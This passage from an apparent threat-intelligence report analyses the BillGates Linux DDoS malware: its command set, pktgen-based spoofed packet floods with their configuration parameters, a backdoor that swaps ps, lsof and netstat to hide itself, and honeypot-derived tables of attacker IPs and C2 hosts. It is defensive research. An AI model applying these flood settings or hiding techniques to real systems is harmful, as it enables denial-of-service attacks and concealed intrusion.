Host mode complete, MainBeikong concludes by calling MainProcess,\nthe core functionality of BillGates when operating in either Host or Backdoor modes. MainProcess\nbegins by initializing five global objects:\n\n**CLASS NAME** **GLOBAL VARIABLE** **DESCRIPTION**\n\nContains a list of DNS servers as specified by the victim’s\nCDNSCache g_dnsCache /etc/resolv.conf file plus the Google open DNS servers\n8.8.8.8 and 8.8.4.4.\n\nContains the current configuration for the binary. When the\nCConfigDoing g_cnfgDoing configuration is stored on disk, the configuration exists in\nthe same directory as the binary in the conf.n file.\n\nContains the current state of the current task. When stored\nCCmdDoing g_cmdDoing on disk, the state exists in the same directory as the binary\nin the file cmd.n.\n\nMaintains the current state of the victim machine in the\nCStatBase g_statBase\nsame way CStatBase performs the task for Elknot.\n\nContains a list of 302 DNS servers in China, 14 DNS servers\nCProvinceDNS g_provinceDns in Taiwan, 11 DNS servers in Hong Kong, 2 DNS servers in\nJapan, and 2 DNS servers in Macau.\n\nMainProcess will attempt to install a kernel driver located at /usr/lib/xpacket.ko by passing the\nappropriate insmod command to the system function. It is unclear where the xpacket.ko file originates\nas it was not installed by the BillGates malware samples observed and analyzed by Novetta.\n\nFollowing the insmod command, another global object named CAmpResources is initialized.\nCAmpResources handles a list of IP addresses that are stored in /usr/lib/libamplify.so (if present).\n\nThe core of BillGates, as was the case with Elknot, is the object CManager. The last object to be\ninitialized, CManager is dynamically created and activated by calling CManager::Initialize. After\nactivating the CManager object, MainProcess will enter an infinite loop that calls CUtility::Sleep\nto put the current thread to sleep in 1 minute intervals, indefinitely, in order to prevent the BillGates\nbinary from terminating while CManager is active in another thread.\n\nWhen CManager::Initialize is called, the function begins initializing a significant number of\nsubsystems, each contained within their own objects. CManager::Initialize creates and activates\nthe following objects:\n\n\n-----\n\n**CLASS NAME** **DESCRIPTION**\n\nCThreadSignaledMessageList Analogue of Elknot’s CThreadMessageList<CCmdMessage>\n<CCmdMsg> object.\n\n\nCThreadTaskGates\n\n\nManager of incoming administrative tasks such as starting a\nnew attack, starting a new remote shell channel, and stopping\nattacks. Waits for new CCmdMsg objects to appear in the\nCThreadSignaledMessageList<CCmdMsg> list and processes\nthem accordingly.\n\n\nCThreadClientStatus Analogue of Elknot’s CThreadHostStatus object.\n\nCThreadSignaledMessage Container housing pointers to CThreadConnection objects\nList<CThreadConnection> which represent active network channels.\n\n\nCThreadRecycle\n\n\nCThreadConnection garbage collector. Polls\nCThreadSignaledMessageList<CThreadConnection> waiting\nfor connections that need to be removed from the list of active\nconnections.\n\n\nCThreadLoopCmd Container class that manages a CLoopCmd object.\n\nAn object whose purpose in life appears to be validating that the\nCThreadFakeDetect\nbinary communicating with the C2 is not a honeypot/fake client.\n\nCThreadSignaledMessageList Container housing pointers to CThreadShell objects which\n<CThreadShell> represent active remote shell commands.\n\n\nCThreadShellRecycle\n\n\nRemote shell connection garbage collector. Polls\nCThreadSignaledMessageList<CThreadShell> waiting for\nthe completion of CThreadShell objects and removes the\ncompleted objects from the list.\n\n\nPrior to initializing CThreadLoopCmd, CManager::Initialize calls CCmdDoing::GetCmd in order to\nobtain any unprocessed or in-progress attack commands. If the CCmdDoing object contains a task, the\ntask is transferred to CThreadLoopCmd for immediate processing.\n\nAfter initializing the subsystems, CManager::Initialize calls CManager::MainProcess.\nCManager::MainProcess determines if the Host mode binary should operate as a client to a C2\nserver or as a server waiting for incoming commands from an external party. If the g_iGatsIsFx\nglobal flag is set (as defined by the configuration processed earlier by CSysTools::SelfInit),\nthe Host mode binary will operate as a client to a C2 server. When operating as a client,\nCManager::MainProcess will query the list of available domains (stored in the g_strConnTgts\nvariable) and for each C2 address found, a new CThreadFXConnection object is generated, initialized,\nand activated. CThreadFXConnection objects represent the encapsulation of a connection between\nthe Host mode binary and the C2 server. When activated, CThreadFXConnection objects call\nCManager::FXConnectionProcess, which then generates a TCP connection between the binary and\nthe C2 server. If a connection is successful, CManager::ConnectionProcess is called.\n\nIf the Host mode binary is operating as a server, CManager::ZXMainProcess is called by\nCManager::MainProcess. CManager::ZXMainProcess generates a listening TCP socket on the port\nspecified by g_iGatsPort. Incoming connections to the port result in new CThreadConnection\nobjects being generated and, ultimately, CManager::ConnectionProcess being called to handle\nthe communication.\n\n\n-----\n\nRegardless of the communication mode CManager::MainProcess activates, the function concludes\nby entering an infinite loop that sleeps for 1 hour intervals.\n\nCManager::ConnectionProcess generates an initial beacon to the endpoint by calling\nCManager::MakeInitResponse. CCommunicate::MakeSend encapsulates the beacon in a format\nconsisting of a DWORD indicating the type of data being sent, another DWORD containing the\nsize of the data to follow, and finally the data itself. The completed datagram is then given to\nCNetBase::Send for transmission to the end point. As is the case with Elknot, BillGates does not\nemploy any form of network encryption.\n\nAfter sending the initial beacon, CManager::ConnectionProcess enters an infinite loop of\nreceiving command packets via CManager::RecvCommand, processing the command, and\nsending a status update by calling CManager::SendClientStatus. In the same fashion that Elknot\nhandled incoming commands, CManager::RecvCommand reads four bytes from the network to\ndetermine the type of command being received. Another network read of four bytes is made\nto determine the size of the command’s data package, followed by a final read (if the data\nsize is greater than 0) for the data package. This network format is the same format that the\nCCommunicate::MakeSend uses when transmitting data to an endpoint. Each command is stored\nin a CCmdMsg object and added to the CThreadSignaledMessageList<CCmdMsg> list by calling\nCThreadSignaledMessageList<CCmdMsg>::MessageSend.\n\nBillGates in Host or Backdoor mode supports 7 different administrative commands:\n\nCOMMAND ID DESCRIPTION\n\n1 Adds (and starts) a new DDoS attack by calling CManager::DoAtkStartCommand.\n\nTerminates an active update operation (if CManager.fUpdateInProgress flag is\n2 set) by calling CManager::StopUpdate, otherwise stops the current DDoS operation by calling CManager::StopAtkTask.\n\n3 Updates the configuration by calling CManager::DoConfigCommand\n\nPerforms an on-the-fly upgrade of the BillGates binary by calling\n5\nCManager::DoUpdateCommand.\n\n7 Updates the current CCmdDoing object by calling CManager::DoCommandCommand.\n\nPerforms a BillGates node authenticity validation by calling\n8\nCManager::DoFakeDetectCommand.\n\nIssues a command for the victim’s system to process via the command shell\n9\nobject CThreadShell by calling CManager::DoShellCommand.\n\nIt is the responsibility of CManager::TaskGatesProcess to dispatch the various messages contained\nwithin the CThreadSignaledMessageList<CCmdMsg> object. CManager::TaskGatesProcess is\ncalled by CThreadTaskGates::ProcessMain whenever the CThreadTaskGates object is activated.\nCManager::TaskGatesProcess calls CThreadSignaledMessageList<CCmdMsg>::MessageRecv\nrepeatedly until a CCmdMsg object is found within the queue.\n\n\n-----\n\nThe DDoS functionality of BillGates originates within the CManager::DoAtkStartCommand\nfunction. CManager::DoAtkStartCommand reads the CTask object from the CCmdMsg. The CTask\nobject is used to set the current CConfigDoing task before generating a new CThreadAtkCtrl\nobject. CThreadAtkCtrl contains the DDoS engine as defined by the various subtasks within\nthe CTask. For each CSubTask within the CTask object, CThreadAtkCtrl::ProcessMain will\ndetermine if the class of attack is a “kernel” or “normal” attack. Kernel attacks (type 1) result in\na call to CThreadAtkCtrl::DoKernelSubTask while normal attacks (type 0) result in a call to\nCThreadAtkCtrl::DoNormalSubTask.\n\n3.2.1 BILLGATE’S “KERNEL” DOS ATTACK MODE\nThe CThreadAtkCtrl::DoKernelSubTask function calls CThreadAtkCtrl::StartKernalSubTask,\nwhich in turn generates a new CThreadKernelAtkExcutor object. When activated, the\nCThreadKernelAtkExcutor object calls CThreadKernelAtkExcutor::ProcessMain in order to\ninitiate a DDoS attack using a kernel driver. The first step in generating a DoS attack using a\nkernel driver is to fork the current process by means of the fork function. Following the fork,\nCThreadKernelAtkExcutor::ProcessMain begins calling CThreadKernelAtkExcutor::KCfgDev\nfor each CPU available on the victim’s server. The CThreadKernelAtkExcutor::KCfgDev function\nconfigures the pktgen (packet generator) device[11], located at /proc/net/pktgen/kpktgend_X\nwhere X represents the enumeration of the number of CPUs in the system, by issuing the following\ncommands:\n\nrem_device_all\nadd_device ethY\nmax_before_softirq\n\nThe rem_device_all command effectively removes any attached device currently using the CPU’s\npacket generator. add_device attaches the specified ethY device (where Y is 0, 1, 2, and so on\ndepending on the desired NIC). The command max_before_softirq is a threshold change that\nspecifies how many packets may be generated before being interrupted by the kernel. The authors\nof BillGates made a mistake in their understanding of what the meaning of the X is in the name of\nthe kpktgend_X devices: while X indicates the CPU associated with the particular packet generator,\nthe authors of BillGates are using the NIC number instead. Therefore, if the attack specifies the use of\neth1, then kpktgend_1 is configured and attached to eth1. The result of this mistake is that instead of\nutilizing multiple CPU cores to generate packets, BillGates is limited to using a single CPU core. While\nthe pktgen driver is still capable of producing a significant number of packets on a single CPU core, the\nperformance could be significantly enhanced had the authors properly utilized the pktgen device.\n\nAfter performing the initial configuration of the pktgen device,\nCThreadKernelAtkExcutor::ProcessMain calls CThreadKernelAtkExcutor::KCfgCfg\nto configure each packet generator through the /proc/net/pktgen/ethY interface.\nCThreadKernelAtkExcutor::KCfgCfg issues the following commands in the order presented below:\n\n_11\u0007“Linux Foundation. “pktgen” http://www.linuxfoundation.org/collaborate/workgroups/networking/pktgen 19 November 2009_\n\n\n-----\n\n**COMMAND** **EXPLANATION**\n\ncount 0 Sets the number of packets to send to 0.\n\nclone_skb 0 Specifies that a single socket sends a single packet.\n\ndelay 0 Specifies that there should be no delay in sending packets.\n\nSpecifies that the size of the packet should be randomized\nTXSIZE_RND within the bounds defined by min_pkt_size and max_pkt_\nsize.\n\nmin_pkt_size X Specifies the minimum packet size (as indicated by X).\n\nmax_pkt_size X Specifies the maximum packet size (as indicated by X).\n\nSpecifies that the source IP address for packets should be\nIPSRC_RND random and between the values specified by src_min and\nsrc_max.\n\nSpecifies the lowest IP (as indicated by X) to use when\nsrc_min X\nspoofing a source address.\n\nSpecifies the highest IP (as indicated by X) to use when\nsrc_max X\nspoofing a source address.\n\nSpecifies the lowest port (as indicated by X) to use when\nudp_src_min X\nspoofing a source port.\n\nSpecifies the highest port (as indicated by X) to use when\nudp_src_max X\nspoofing a source port.\n\nSpecifies the destination IP (as indicated by X) that will receive\ndst X\nthe generated packet.\n\nSpecifies the lowest destination port (as indicated by X) to\nudp_dst_min X\nreceive the generated packet.\n\nSpecifies the highest destination port (as indicated by X) to\nudp_dst_max X\nreceive the generated packet.\n\nSpecifies the destination MAC address. This value will typically\ndst_mac {mac address}\nbe 00:00:00:00:00:00.\n\nIf greater than 0, the attack will be sent to one or more IP\nis_multi {0 or more}\naddresses where the number specifies the number of destinations.\n\nIf is_multi was set to greater than 0, then for each target IP\nmulti_dst {IP address} the command multi_dst is issued to specify the IP address for\nan individual target.\n\n\npkt_type X\n\n\nBelieved to specify the type of packet to generate and hence\nthe type of attack. The value (X) is specified by the CSubTask\nthat defines the attack. This is not a pktgen parameter but may\nbe a feature of the xpacket.ko driver BillGates attempts to\nload into the kernel.\n\n\n-----\n\ndns_domain X\n\nsyn_flag X\n\nis_dns_random {1 or 0}\n\ndns_type X\n\nis_edns {1 or 0}\n\nedns_len X\n\nis_edns_sec {1 or 0}\n\n\nBelieved to specify (as indicated by X) the domain name to\ntarget (for DNS attacks). The value is specified by the CSubTask\nthat defines the attack. This is not a pktgen parameter but may\nbe a feature of the xpacket.ko driver BillGates attempts to\nload into the kernel.\n\nBelieved to specify the TCP flags value as indicated by X.\nThe value is specified by the CSubTask that defines the attack.\nThis is not a pktgen parameter but may be a feature of the\nxpacket.ko driver BillGates attempts to load into the kernel.\n\nBelieved to specify if a random subdomain of the target domain name is to be generated in much the same way Elknot’s\n0x83 attack performs. The value is specified by the CSubTask\nthat defines the attack. This is not a pktgen parameter but may\nbe a feature of the xpacket.ko driver BillGates attempts to\nload into the kernel.\n\nBelieved to specify the type of DNS query to generate as\nindicated by X. The value is specified by the CSubTask that\ndefines the attack. This is not a pktgen parameter but may be\na feature of the xpacket.ko driver BillGates attempts to load\ninto the kernel.\n\nThe intent of this command is unknown. The value is specified\nby the CSubTask that defines the attack. This is not a pktgen\nparameter but may be a feature of the xpacket.ko driver\nBillGates attempts to load into the kernel.\n\nThe intent of this command is unknown. The value is specified\nby the CSubTask that defines the attack. This is not a pktgen\nparameter but may be a feature of the xpacket.ko driver\nBillGates attempts to load into the kernel.\n\nThe intent of this command is unknown. The value is specified\nby the CSubTask that defines the attack. This is not a pktgen\nparameter but may be a feature of the xpacket.ko driver\nBillGates attempts to load into the kernel.\n\n\nAfter configuring the parameters for pktgen (or its possible xpacket.ko replacement),\nCThreadKernelAtkExcutor::ProcessMain begins the attack by writing “start” to /proc/net/\npktgen/pgctrl.\n\n\n-----\n\n3.2.1 BILLGATE’S “NORMAL” DOS ATTACK MODE\nThe complement to the kernel level DoS attack generator occurs within\nCThreadAtkCtrl::DoNormalSubTask. When a task requests a standard (or “normal”) sub-task,\nCThreadAtkCtrl::ProcessMain calls CThreadAtkCtrl::DoNormalSubTask which in turn calls\nCThreadAtkCtrl::StartNormalSubTask. For each sub-task, a new CThreadNormalAtkExcutor is\ngenerated and executed resulting in CThreadNormalAtkExcutor::ProcessMain being called. Based\non the CSubTask.taskType field, CThreadNormalAtkExecutor::ProcessMain will generate a specific\ntype of attack object (all of whom are derived from the CPacketAttack base class):\n\n`CSubTask.taskType` **ATTACK OBJECT** **ATTACK TYPE**\n\n0x10 or 0x11 and CAttackSyn SYN Flood\nfield6 = 0\n\n0x10 or 0x11 and CAttackCompress Custom IP Header Flood. Sends TCP packets\nfield6 = 1 with an attacker-specified TCP header to the\nspecified endpoint. This is potentially used for\na Teardrop attack.\n\n0x20 CAttackUdp UDP Packet Flood\n\n0x21, 0x23 or 0x24 CAttackDns Random DNS Subdomain Flood\n\n0x22 CAttackAmp DNS Amplification Attack\n\n0x25 CAttackPrx An unspecified form of DNS attack\n\n0x30 CAttackIcmp PING Flood\n\n0x40 CTcpAttack Arbitrary TCP Data. Sends an attackerspecified data stream to the a specified TCP\nendpoint.\n\n0x41 CAttackCc HTTP Request Flood. Requests a series of\nURLs from a HTTP server.\n\n0x42 CAttackIe Not currently implemented. Simply waits\nwithout sending any data.\n\n\n-----\n\nRegardless of the type of attack object generated, ThreadNormalAtkExcutor::ProcessMain makes\nthe following function calls, in order:\n\n**ATTACK OBJECT FUNCTION** **DESCRIPTION**\n\n<Object>::Create Constructs the attack-specific information necessary to generate\npackets for the given attack type.\n\n<Object>::Do Typically calls the attack object’s ::MakePackets member\nfunction to construct the attack packet based on the information\ngenerated by the ::Create member. Calls the member function\n::UpdateCurVariant to alter attributes of each constructed packet\nsuch as the sequence number to avoid retransmission detection.\nOnce the packet is ready for transmission, calls the ::SendPacket\nmember function to perform the transmission to the target.\n\nThe ::Do function is called repeatedly until the\nspecified number of attacks has been transmitted by\nThreadNormalAtkExcutor::ProcessMain.\n\n3.3 GATE 2: BACKDOOR MODE\nWhen activated in gate 2 mode, the BillGates malware operates in a similar, albeit somewhat more\nsimplistic, manner as the Host (gate 1) mode. Initiated by calling the MainBackdoor function,\nbackdoor mode begins by calling CSystool::SelfInit with a different configuration than found in\ngate 0 and gate 1 modes. The MainBackdoor function determines if it is already active by checking\nfor the presence (and exclusivity) of /usr/bin/bsd-port/getty.lock. If the file is either missing\nor readable (meaning another process has not applied an exclusivity lock on the file), then the\nMainBackdoor begins the process of initializing the backdoor mode.\n\nThe first task MainBackdoor performs, as part of its initialization routine, is to write the current\nPID of the gate 2 process to the file /usr/bin/bsd-port/getty.lock. MainBackdoor calls\nCSysTool::MarkPid, which performs two tasks: 1) write the PID of the gate 2 process as an ASCII\nnumber within the specified file and 2) return a file descriptor of the file after setting the exclusivity\nflag of the file. With the lock file established, CUtility::SetAutoStart is called in order to install the\nbackdoor as a recurring service after a system reboot. Backdoor mode uses a different service name\nthan the service name used by Host mode.\n\nMainBackdoor calls CSysTool::HandleSystools in order to setup the ability for gate 3 mode\nto obscure specific output from ps, lsof, and netstat system tools in order to obfuscate the\nmalware’s presence on the system. CSysTool::HandleSystools begins by making a new directory at\n/usr/bin/dpkgd/md. Next, CSysTool::HandleSystools begins looking for the following files:\n\n\n-----\n\n  - /bin/netstat\n\n  - /bin/lsof\n\n  - /bin/ps\n\n  - /usr/bin/netstat\n\n  - /usr/bin/lsof\n\n  - /usr/bin/ps\n\n  - /usr/sbin/netstat\n\n  - /usr/sbin/lsof\n\n  - /usr/sbin/ps\n\nFor each of the files found, a copy of the file is made to the /usr/bin/dpkgd directory.\nCSysTool::ReleaseGates is called with the original binary’s path in order to copy the BillGates\nmalware over the original, legitimate Linux binary. To ensure that the copy of the original binary is\nexecutable, CSysTool::HandleSystools issues the chmod 0755 command for each of the legitimate\nbinaries copied.\n\nWith the necessary legitimate system binaries replaced, MainBackdoor calls MainProcess. At this\npoint the behavior of the Backdoor and Host modes become the same (so far as their respective\nconfiguration values dictate).\n\n3.4 GATE 3: UTILITY SPOOFING\nThe BillGates malware can hide some aspects of itself from a victim who is using standard Linux tools\nsuch as ps, lsof, and netstat to determine system status. When activated in gate 3 mode, BillGates acts\nas a proxy for the real Linux binaries while also removing tell-tale signs of itself from the tools’ outputs.\n\nGate 3 mode begins within the MainSystool function. Once called, MainSystool determines which\ntool it is mimicking by calling CUtility::GetCurrentPathFile. CUtility::GetCurrentPathFile\nreturns the value from /proc/{PID}/exe. MainSystool then attempts to locate the legitimate\nLinux binary within the /usr/bin/dpkgd directory. For example, if the victim called /usr/bin/lsof,\nMainSystool will determine if /usr/bin/dpkgd/lsof exists on the victim’s machine. If the legitimate\nbinary does exist, MainSystool will reconstruct the original command line arguments (negating\nthe argv[0] value) and then call the popen function with the legitimate binary as the argument to\nthe function. By calling popen, MainSystool can capture and parse the output from the legitimate\nbinary. Using fgets in order to read each line of output from the legitimate binary, MainSystool will\nscan the lines for 1) any reference to the backdoor path (e.g. /usr/bin/bsd-port) and 2) a specific\nport (e.g. 10060). If a line contains either of the two trigger references, the line is quietly dropped;\notherwise, the original line from the legitimate binary’s output is printed to the terminal. An example\nof this behavior can be seen below where a call to lsof -i generates the following output on a\nvictim’s server:\n\nmalware 15878 root  6u IPv4 1576702   0t0 TCP\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15908 root  6u IPv4 1576702   0t0 TCP\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15909 root  6u IPv4 1576702   0t0 TCP\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15910 root  6u IPv4 1576702   0t0 TCP\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15911 root  6u IPv4 1576702   0t0 TCP\n\n\n-----\n\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15912 root  6u IPv4 1576702   0t0 TCP\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15913 root  6u IPv4 1576702   0t0 TCP\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15914 root  6u IPv4 1576702   0t0 TCP\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15915 root  6u IPv4 1576702   0t0 TCP\n192.168.122.133:44748->104.233.142.216:webmin (SYN_SENT)\n\nredis-ser 126175 root  4u IPv6 1054379   0t0 TCP *:6379 (LISTEN)\n\nredis-ser 126175 root  5u IPv4 1054380   0t0 TCP *:6379 (LISTEN)\n\nBy using the legitimate lsof, the output becomes (with the previously missing lines in bold):\n\nmalware 15878 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n\ngetty   15897 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN_SENT)\n\nmalware 15908 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15909 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15910 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15911 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15912 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15913 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15914 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n\nmalware 15915 root  6u IPv4 1577209   0t0 TCP\n192.168.122.133:44781->104.233.142.216:webmin (SYN_SENT)\n```\ngetty   15954 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN _ SENT)\ngetty   15955 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN _ SENT)\ngetty   15956 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN _ SENT)\ngetty   15957 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN _ SENT)\ngetty   15958 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN _ SENT)\n\n```\n\n-----\n\n```\ngetty   15959 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN _ SENT)\ngetty   15960 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN _ SENT)\ngetty   15961 root  6u IPv4 1577210   0t0 TCP 192.168.122.133:46283>120.24.57.79:10060 (SYN _ SENT)\n\n```\nredis-ser 126175 root  4u IPv6 1054379   0t0 TCP *:6379 (LISTEN)\n\nredis-ser 126175 root  5u IPv4 1054380   0t0 TCP *:6379 (LISTEN)\n\nThe BillGates lsof hides the port 10060 traffic but fails to hide the Host mode (malware) traffic. This\nindicates that the authors do not mind exposing some portions of their malware to victims but are\nparticularly sensitive about hiding the presence of the backdoor mode of BillGates.\n\n4. ATTACK PROFILES\nNovetta developed a soon-to-be open-sourced honeypot named Delilah, which is loosely based on\nJordan Wright’s Elastichoney[12]. Delilah not only captures the commands from attackers attempting to\nexploit the previously mentioned Elasticsearch vulnerability, but actively catalogues the commands,\nsends notifications, and grabs any files the attackers are attempting to introduce on a victim’s system.\nThis open-source project provides an array of configurable parameters to better mimic Elasticsearch\ninstances and prevent an attacker from easily determining that they are interacting with a honeypot\nand not a real, vulnerable server.\n\nAfter deploying Delilah on a variety of geographically dispersed servers, patterns began to emerge\nrevealing not only how the attackers were actively attempting to infect servers, but also how each\nindividual actor could be identified by their infrastructure. Novetta ran Delilah through the month of\nApril 2015 and observed 24 different IP addresses utilizing the Elasticsearch vulnerability to infect\nvulnerable hosts. From these 24 distinct IPs performing Elasticsearch attacks, Novetta observed the\nDelilah-simulated vulnerable Elasticsearch servers downloading and executing 47 distinct malicious\nbinaries from web servers hosted by 28 unique IPs. The bulk of the malicious binaries are BillGates\nvariants (19) and Elknot binaries (18). The 16 other binaries installed by actors using the Elasticsearch\nvulnerability consisted of 2 Linux/AES.DDoS binaries, 2 unknown binaries, and 12 binaries that did not\nproperly download from their respective web servers.\n\nIt is possible to immediately reduce the number of possible actors from 24 (based on unique IP\naddresses) to 21 by simply drawing a line between each of the 24 attack IP addresses and the\nIP addresses of the web servers that the attacks utilize. Interestingly, the actors exploiting the\nElasticsearch vulnerability to infect servers with DDoS malware have a common pattern of using\nsimilar command scripts to infect Elasticsearch servers and download malware from a specific type\nof web server. MalwareMustDie (MMD) reported in November 2014 on this method by which actors in\nChina were utilizing the Elasticsearch vulnerability to install their DDoS malware (though it is unclear if\nthat malware is BillGates or Elknot)[13].\n\n_12\u0007“Jordan Wright. “Introducing Elastichoney - an Elasticsearch Honeypot”_\n_http://jordan-wright.github.io/blog/2015/03/23/introducing-elastichoney-an-elasticsearch-honeypot/ 23_\n_March 2015._\n\n_13\u0007 unixfreaxjp. MalwareMustDie. “China ELF botnet malware infection & distribution scheme unleashed”_\n_http://blog.malwaremustdie.org/2014/11/china-elf-botnet-malware-infection.html 7 November 2014._\n\n\n-----\n\nMMD was able to obtain a video tutorial in which an actor demonstrated the deployment system for\nthe attacks[14]; the clear, step-by-step instructions provided in the video could allow similar attacks to\nbe carried out by even low-skilled attackers with access to the proper tools, which are often available\non underground forums. As part of the tutorial, attackers are instructed on how to use the HTTP File\nServer (HFS) web server[15] for hosting files on a local machine. Without fail, each of the web servers\nfound supporting the Elasticsearch exploitation against Delilah-simulated servers were HFS.\n\nThe following table provides details on the attack IPs and HFS servers that Novetta observed during\nApril 2015, separated based on shared indicators. The shared indicators form the initial patterns of\nactivity observed by Novetta derived solely from shared infrastructure.\n\n**BINARY** **SCANNER** **HFS**\n**ID** **SCANNER IP** **DOWNLOAD IP** **FILE ON SERVER**\n**TYPE** **COUNTRY** **COUNTRY**\n\nRedCat3.6.0_\n1 107.160.82.189 119.29.55.190:8084 BILL US CN\nLinuxRmp_Plugins\n\n121.43.225.54:80 PowerEnterABC BILL CN CN\n2 117.21.174.174\n\n120.24.228.240:6954 PowerEnterABC BILL CN CN\n\n3 117.21.176.64 117.21.176.64:4899 http BILL CN CN\n\n116.255.179.202 116.255.179.218:8080 xxl (FAILED DL) CN CN\n4\n\n117.41.184.9 117.41.184.9:8088 xxl (FAILED DL) CN CN\n\nud BILL CN CN\n5 121.79.133.179 121.79.133.179:443\n\nsy BILL CN CN\n\nbbs (FAILED DL) CN CN\n6 180.97.68.244 180.97.68.244:280\n\nbbbs (FAILED DL) CN CN\n\ndown ELKNOT CN CN\n7 183.61.171.225 183.61.171.225:8818\n\nTemp ELKNOT CN CN\n\n8 192.210.53.43 198.13.96.38:7878 wocao ELKNOT US US\n\n9 218.10.17.171 114.215.115.152:8080 alima ELKNOT CN CN\n\nsos BILL CN CN\n10 219.235.4.22 219.235.4.22:7878\n\nsas BILL CN CN\n\nxiaoqiu BILL CN CN\n222.186.15.246:8080\n\nxiao3 ELKNOT CN CN\n\n11 222.186.15.246 xiao3 ELKNOT CN CN\n\n121.42.221.14:666 xiaoqiu32 BILL CN CN\n\nxiaoqiu BILL CN CN\n\n222.186.34.177:1315 udp_25000 (FAILED DL) CN CN\n12 222.186.21.109\n\n222.186.21.109:3435 udp8006 (FAILED DL) CN CN\n\n_14 unixfreaxjp. “China ELF botnet malware infection scheme unleashed”_\n_https://www.youtube.com/watch?v=xehXHy11M9w&index=1&list=PLSe6fLFf1YDX-2sog70220BchQmhVqQ75_\n_7 November 2014._\n\n_15 “HFS - HTTP File Server” http://www.rejetto.com/hfs/?f=intro_\n\n\n-----\n\n13 222.186.21.120 222.186.21.120:6633 Cmak_32 BILL CN CN\n\n14 222.186.34.70 23.234.25.203:15826 udpg BILL CN US\n\nWN (FAILED DL) CN US\n15 222.186.56.21 23.107.16.6:80\n\n2818 UNKNOWN CN US\n\nxudp ELKNOT CN CN\n58.218.213.211:2568\n16 58.218.213.211 Manager BILL CN CN\n\n111.74.239.77:8080 xudp ELKNOT CN CN\n\nddos2.4 BILL CN CN\n17 60.163.21.177 60.163.21.177:6663\n\ngsaa BILL CN CN\n\nwc1 BILL CN CN\n18 60.169.75.99 60.169.75.99:3113\n\nwc BILL CN CN\n\n19 61.160.215.111 122.224.48.28:8000 tooles ELKNOT CN CN\n\nka AES CN CN\n20 61.160.232.221 61.160.232.221:9939\n\nfd AES CN CN\n\n61.176.223.77:111 zlbq ELKNOT CN CN\n\n\n61.176.223.77\n\n\nzlby ELKNOT CN CN\n61.176.223.77:222\n\nzlbu ELKNOT CN CN\n\n\n21\n\n\nzlwanby ELKNOT CN CN\n61.176.222.160:111\n61.176.222.160 zlwanbq ELKNOT CN CN\n\n61.176.222.160:222 zlby ELKNOT CN CN\n\n\n61.176.220.162\n\n\n61.176.220.162:111 zlbsr BILL CN CN\n\nzlbyy ELKNOT CN CN\n61.176.220.162:222\n\nzlwanby ELKNOT CN CN\n\n\nGiven that some of the files did not download from their respective HFS web server (marked in the\nprevious table as “FAILED DL”), it is not possible to extract any configuration information from the\nentirety of the possible samples. But for the samples that Novetta was able to collect, the following C2\ninformation was extracted from 15 of the above patterns:\n\n\n-----\n\n|ID|SCANNER IP|DOWNLOAD IP|FILE ON SERVER|FIRST C2|SECOND C2|\n|---|---|---|---|---|---|\n|1|107.160.82.189|119.29.55.190:8084|RedC...|sbss.f3322.net:58983 [120.27.46.24]||\n|2|117.21.174.174|121.43.225.54:80|Pow...|120.24.228.240:36005|231.78en.com:45000 [no record]|\n|||120.24.228.240:6954|Pow...|120.24.228.240:36005|231.78en.com:45000 [no record]|\n|3|117.21.176.64|117.21.176.64:4899|http|117.21.176.64:36000||\n|5|121.79.133.179|121.79.133.179:443|ud|121.42.51.23:8888|816.dj6cc.com:45000 (xitele) [120.24.57.79]|\n||||sy|121.42.51.23:8888|816.dj6cc.com:45000 (xitele) [120.24.57.79]|\n|7|183.61.171.225|183.61.171.225:8818|down|61.187.98.244:10991|122.225.108.52:10999|\n||||Temp|61.187.98.244:10991|122.225.108.52:10999|\n|8|192.210.53.43|198.13.96.38:7878|wocao|198.13.96.38:10991||\n|9|218.10.17.171|114.215.115.152:8080|alima|114.215.115.152:10991|122.225.108.52:10999|\n|10|219.235.4.22|219.235.4.22:7878|sos|xuyiwz.f3322.net:25000|yeyou.t1linux.com:10060 (xitele) [120.24.57.79]|\n||||sas|xuyiwz.f3322.net:25000||\n|11|222.186.15.246|222.186.15.246:8080|xiaoqiu|pp.pp1987.com:36000 [61.160.232.197]|yeyou.t1linux.com:10060 (xitele) [120.24.57.79]|\n||||xiao3|121.42.221.14:10991|208.98.15.162:2847|\n|||121.42.221.14:666|xiao3|121.42.221.14:10991|208.98.15.162:2847|\n||||xiaoqiu32|pp.pp1987.com:36000 